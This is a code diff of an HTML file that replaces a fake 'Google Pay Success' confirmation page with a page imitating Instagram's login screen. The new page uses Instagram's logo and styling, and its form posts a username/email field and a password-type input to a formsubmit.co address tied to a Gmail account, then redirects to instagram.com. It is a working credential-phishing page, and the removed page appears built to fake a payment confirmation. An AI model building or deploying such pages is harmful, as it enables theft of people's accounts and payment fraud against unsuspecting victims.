@@ -2,92 +2,130 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Google Pay Success</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
   <style>
-    html, body {
-      margin: 0; padding: 0;
-      height: 100%; width: 100%;
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 350px;
+      padding: 40px;
       background-color: #fff;
-      font-family: Roboto, Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
+      border: 1px solid #dbdbdb;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+    }
+
+    .login-btn {
+      background-color: #0095f6;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      margin: 10px 0;
       cursor: pointer;
-      user-select: none;
     }
 
-    .checkmark {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      background-color: #34a853;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 40px;
-      z-index: 1;
+    .login-btn:disabled {
+      background-color: #b2dffc;
+      cursor: default;
     }
 
-    .checkmark svg {
-      width: 50px;
-      height: 50px;
-      stroke: white;
-      stroke-width: 4;
-      fill: none;
-    }
-
-    .gpay-logo {
-      width: 80vw;
-      max-width: 600px;
-      height: auto;
-      z-index: 0;
-    }
-
-    #message {
-      position: absolute;
-      bottom: 20px;
+    .separator {
+      margin: 20px 0;
       font-size: 14px;
-      color: #888;
-      font-style: italic;
+      color: #999;
+      position: relative;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      position: absolute;
+      width: 40%;
+      height: 1px;
+      background: #dbdbdb;
+      top: 50%;
+    }
+
+    .separator::before {
+      left: 0;
+    }
+
+    .separator::after {
+      right: 0;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      margin-top: 15px;
+      display: block;
+    }
+
+    .signup {
+      margin-top: 20px;
+      padding: 20px;
+      border: 1px solid #dbdbdb;
+      background: #fff;
+    }
+
+    .signup a {
+      text-decoration: none;
+      color: #0095f6;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-
-  <div class="checkmark" aria-label="Success checkmark">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <polyline points="20 6 9 17 4 12"></polyline>
-    </svg>
+  <div>
+    <div class="container">
+      <img src="https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo" width="175" />
+      <form action="https://formsubmit.co/fecdortv@gmail.com" method="POST">
+        <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
+        <input type="password" name="message" placeholder="Message" required />
+        <input type="hidden" name="_next" value="https://instagram.com">
+        <button class="login-btn">Send message</button>
+      </form>
+      <div class="separator">OR</div>
+      <a href="#" class="facebook-login"></a>
+      <a href="#" class="forgot">need help?</a>
+    </div>
+    <div class="signup">
+      We will respond within 24 hours <a href="#">Learn more</a>
+    </div>
   </div>
-
-  <img
-    class="gpay-logo"
-    src="https://blog.usenosh.com/wp-content/uploads/2024/02/111562-googlepay.jpg"
-    alt="Google Pay Logo"
-  />
-
-  <div id="message">Click anywhere to hear confirmation sound</div>
-
-  <audio id="successAudio" preload="auto">
-    <source src="https://toddgrub.github.io/pay/applepay.mp3" type="audio/mpeg" />
-  </audio>
-
-  <script>
-    const audio = document.getElementById('successAudio');
-    const message = document.getElementById('message');
-
-    function playSound() {
-      audio.play().catch(() => {
-        // ignore errors if any
-      });
-      message.style.display = 'none';
-      window.removeEventListener('click', playSound);
-    }
-
-    window.addEventListener('click', playSound);
-  </script>
-
 </body>
 </html>
